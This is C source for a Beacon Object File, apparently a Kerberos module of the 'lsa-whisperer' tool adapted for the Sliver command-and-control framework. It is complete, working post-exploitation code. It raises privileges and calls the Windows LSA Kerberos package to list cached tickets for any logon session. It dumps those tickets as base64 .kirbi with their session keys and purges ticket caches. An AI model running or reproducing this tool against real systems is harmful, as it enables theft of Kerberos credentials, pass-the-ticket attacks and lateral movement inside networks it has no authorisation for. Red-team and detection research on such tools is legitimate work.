/*
 * lsa-whisperer BOF - Kerberos Module
 * Handles: klist, dump, purge
 *
 * Uses LsaCallAuthenticationPackage with Kerberos authentication package
 * to enumerate, export, and purge cached Kerberos tickets.
 *
 * Original: https://github.com/dazzyddos/lsawhisper-bof
 * Adapted for Sliver armory integration
 */

#include "../../include/bofdefs.h"
#include "../../include/lsa_structs.h"

/* Forward declarations from common */
extern BOOL ParseLUID(const char* str, PLUID luid);
extern BOOL EnableTcbPrivilege(void);
extern NTSTATUS LsaConnect(PHANDLE hLsa, BOOL trusted);
extern NTSTATUS LsaLookupPackage(HANDLE hLsa, const char* packageName, PULONG packageId);
extern void PrintHexBytes(const char* label, PUCHAR data, ULONG length);
extern void PrintUnicodeString(const char* label, PUNICODE_STRING str);
extern const char* GetEncryptionTypeName(LONG encType);
extern void PrintTicketFlags(ULONG flags);
extern void PrintFileTime(const char* label, LARGE_INTEGER* ft);
extern int Base64Encode(const UCHAR* input, ULONG inputLen, char* output, ULONG outputLen);

/* ============================================================
 * DoKerbQueryTickets - List cached Kerberos tickets
 * ============================================================ */

void DoKerbQueryTickets(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: Kerberos Ticket Cache\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, MICROSOFT_KERBEROS_NAME_A, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaLookupAuthenticationPackage failed: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* Query ticket cache (Extended) */
    KERB_QUERY_TKT_CACHE_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = KerbQueryTicketCacheExMessage;
    request.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa,
        packageId,
        &request,
        sizeof(request),
        &response,
        &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaCallAuthenticationPackage failed: status=0x%08x sub=0x%08x\n",
                     status, subStatus);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PKERB_QUERY_TKT_CACHE_EX_RESPONSE cacheResp = (PKERB_QUERY_TKT_CACHE_EX_RESPONSE)response;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %u cached ticket(s)\n\n", cacheResp->CountOfTickets);

    for (ULONG i = 0; i < cacheResp->CountOfTickets; i++) {
        PKERB_TICKET_CACHE_INFO_EX ticket = &cacheResp->Tickets[i];

        BeaconPrintf(CALLBACK_OUTPUT, "=== Ticket #%u ===\n", i);
        PrintUnicodeString("  Client", &ticket->ClientName);
        PrintUnicodeString("  ClientRealm", &ticket->ClientRealm);
        PrintUnicodeString("  Server", &ticket->ServerName);
        PrintUnicodeString("  ServerRealm", &ticket->ServerRealm);
        BeaconPrintf(CALLBACK_OUTPUT, "  EncType    : %s (%d)\n",
                     GetEncryptionTypeName(ticket->EncryptionType), ticket->EncryptionType);
        PrintTicketFlags(ticket->TicketFlags);
        PrintFileTime("Start", &ticket->StartTime);
        PrintFileTime("End", &ticket->EndTime);
        PrintFileTime("Renew", &ticket->RenewTime);
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * DoKerbDumpTickets - Export tickets as base64 .kirbi
 * ============================================================ */

void DoKerbDumpTickets(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: Kerberos Ticket Dump\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, MICROSOFT_KERBEROS_NAME_A, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Package lookup failed: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* First enumerate tickets */
    KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
    memset(&cacheReq, 0, sizeof(cacheReq));
    cacheReq.MessageType = KerbQueryTicketCacheExMessage;
    cacheReq.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa, packageId, &cacheReq, sizeof(cacheReq),
        &response, &responseLen, &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Ticket enumeration failed: 0x%08x / 0x%08x\n", status, subStatus);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PKERB_QUERY_TKT_CACHE_EX_RESPONSE cacheResp = (PKERB_QUERY_TKT_CACHE_EX_RESPONSE)response;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Dumping %u ticket(s)...\n\n", cacheResp->CountOfTickets);

    /* Now retrieve each ticket with full data */
    for (ULONG i = 0; i < cacheResp->CountOfTickets; i++) {
        PKERB_TICKET_CACHE_INFO_EX ticketInfo = &cacheResp->Tickets[i];
        PVOID ticketResponse = NULL;
        ULONG ticketResponseLen = 0;

        /* Build retrieve request - need to allocate enough space for the server name */
        ULONG reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + ticketInfo->ServerName.MaximumLength;
        PKERB_RETRIEVE_TKT_CACHE_REQUEST retrieveReq =
            (PKERB_RETRIEVE_TKT_CACHE_REQUEST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reqSize);

        if (retrieveReq == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed for ticket #%u\n", i);
            continue;
        }

        retrieveReq->MessageType = KerbRetrieveEncodedTicketMessage;
        retrieveReq->LogonId = *targetLuid;
        retrieveReq->TicketFlags = 0;
        retrieveReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
        retrieveReq->EncryptionType = ticketInfo->EncryptionType;

        /* Copy server name into request */
        retrieveReq->TargetName.Length = ticketInfo->ServerName.Length;
        retrieveReq->TargetName.MaximumLength = ticketInfo->ServerName.MaximumLength;
        retrieveReq->TargetName.Buffer = (PWSTR)((PBYTE)retrieveReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
        memcpy(retrieveReq->TargetName.Buffer, ticketInfo->ServerName.Buffer, ticketInfo->ServerName.Length);

        NTSTATUS ticketStatus, ticketSubStatus;
        ticketStatus = LsaCallAuthenticationPackage(
            hLsa, packageId,
            retrieveReq, reqSize,
            &ticketResponse, &ticketResponseLen,
            &ticketSubStatus
        );

        if (ticketStatus == 0 && ticketSubStatus == 0 && ticketResponse != NULL) {
            PKERB_RETRIEVE_TKT_RESPONSE tktResp = (PKERB_RETRIEVE_TKT_RESPONSE)ticketResponse;

            BeaconPrintf(CALLBACK_OUTPUT, "=== Ticket #%u ===\n", i);
            PrintUnicodeString("  Server", &ticketInfo->ServerName);
            PrintUnicodeString("  Realm", &ticketInfo->ServerRealm);
            BeaconPrintf(CALLBACK_OUTPUT, "  EncType  : %s (%d)\n",
                         GetEncryptionTypeName(ticketInfo->EncryptionType), ticketInfo->EncryptionType);

            /* Print session key */
            if (tktResp->Ticket.SessionKey.Length > 0) {
                PrintHexBytes("  SessionKey", tktResp->Ticket.SessionKey.Value,
                              tktResp->Ticket.SessionKey.Length);
            }

            /* Base64 encode and print the ticket */
            if (tktResp->Ticket.EncodedTicketSize > 0 && tktResp->Ticket.EncodedTicket != NULL) {
                ULONG b64Len = 4 * ((tktResp->Ticket.EncodedTicketSize + 2) / 3) + 1;
                char* b64Buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, b64Len);

                if (b64Buf != NULL) {
                    Base64Encode(tktResp->Ticket.EncodedTicket,
                                 tktResp->Ticket.EncodedTicketSize,
                                 b64Buf, b64Len);

                    BeaconPrintf(CALLBACK_OUTPUT, "  TicketSize: %u bytes\n", tktResp->Ticket.EncodedTicketSize);
                    BeaconPrintf(CALLBACK_OUTPUT, "  Base64 (.kirbi):\n");

                    /* Print in chunks to avoid Beacon output limits */
                    ULONG b64ActualLen = (ULONG)strlen(b64Buf);
                    ULONG chunkSize = 76; /* Standard base64 line width */
                    for (ULONG off = 0; off < b64ActualLen; off += chunkSize) {
                        char chunk[80];
                        ULONG remaining = b64ActualLen - off;
                        ULONG toCopy = remaining < chunkSize ? remaining : chunkSize;
                        memcpy(chunk, b64Buf + off, toCopy);
                        chunk[toCopy] = '\0';
                        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", chunk);
                    }

                    HeapFree(GetProcessHeap(), 0, b64Buf);
                }
            }

            BeaconPrintf(CALLBACK_OUTPUT, "\n");
            LsaFreeReturnBuffer(ticketResponse);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve ticket #%u: 0x%08x / 0x%08x\n",
                         i, ticketStatus, ticketSubStatus);
        }

        HeapFree(GetProcessHeap(), 0, retrieveReq);
    }

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * DoKerbPurgeTickets - Remove cached tickets
 * ============================================================ */

void DoKerbPurgeTickets(LUID* targetLuid, const char* serverFilter) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: Purge Kerberos Tickets\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    if (serverFilter && strlen(serverFilter) > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Server filter: %s\n", serverFilter);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Purging ALL tickets\n");
    }

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, MICROSOFT_KERBEROS_NAME_A, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Package lookup failed: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* Build purge request */
    ULONG reqSize = sizeof(KERB_PURGE_TKT_CACHE_REQUEST) + 512;
    PKERB_PURGE_TKT_CACHE_REQUEST purgeReq =
        (PKERB_PURGE_TKT_CACHE_REQUEST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reqSize);

    if (purgeReq == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    purgeReq->MessageType = KerbPurgeTicketCacheMessage;
    purgeReq->LogonId = *targetLuid;

    /* Set server name filter if provided */
    if (serverFilter && strlen(serverFilter) > 0) {
        WCHAR wServerName[256];
        int wLen = MultiByteToWideChar(CP_UTF8, 0, serverFilter, -1, wServerName, 256);
        if (wLen > 0) {
            purgeReq->ServerName.Buffer = (PWSTR)((PBYTE)purgeReq + sizeof(KERB_PURGE_TKT_CACHE_REQUEST));
            purgeReq->ServerName.Length = (USHORT)((wLen - 1) * sizeof(WCHAR));
            purgeReq->ServerName.MaximumLength = (USHORT)(wLen * sizeof(WCHAR));
            memcpy(purgeReq->ServerName.Buffer, wServerName, wLen * sizeof(WCHAR));
        }
    }

    /* Empty realm */
    purgeReq->RealmName.Buffer = NULL;
    purgeReq->RealmName.Length = 0;
    purgeReq->RealmName.MaximumLength = 0;

    status = LsaCallAuthenticationPackage(
        hLsa, packageId,
        purgeReq, reqSize,
        &response, &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Ticket purge failed: status=0x%08x sub=0x%08x\n", status, subStatus);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Ticket(s) purged successfully!\n");
    }

    HeapFree(GetProcessHeap(), 0, purgeReq);
    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * BOF Entry Point
 * ============================================================ */

#ifdef BOF
void go(char* args, int len) {
    datap parser;
    char* command = NULL;
    char* luidStr = NULL;
    char* extraArg = NULL;
    LUID targetLuid = { 0, 0 };

    BeaconDataParse(&parser, args, len);
    command = BeaconDataExtract(&parser, NULL);

    if (command == NULL || strlen(command) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No command specified. Use: klist, dump, purge\n");
        return;
    }

    luidStr = BeaconDataExtract(&parser, NULL);
    if (luidStr && strlen(luidStr) > 0) {
        ParseLUID(luidStr, &targetLuid);
    }

    if (_stricmp(command, "klist") == 0) {
        DoKerbQueryTickets(&targetLuid);
    }
    else if (_stricmp(command, "dump") == 0) {
        DoKerbDumpTickets(&targetLuid);
    }
    else if (_stricmp(command, "purge") == 0) {
        extraArg = BeaconDataExtract(&parser, NULL);
        DoKerbPurgeTickets(&targetLuid, extraArg);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Unknown command: %s\n", command);
        BeaconPrintf(CALLBACK_ERROR, "[-] Valid commands: klist, dump, purge\n");
    }
}
#endif
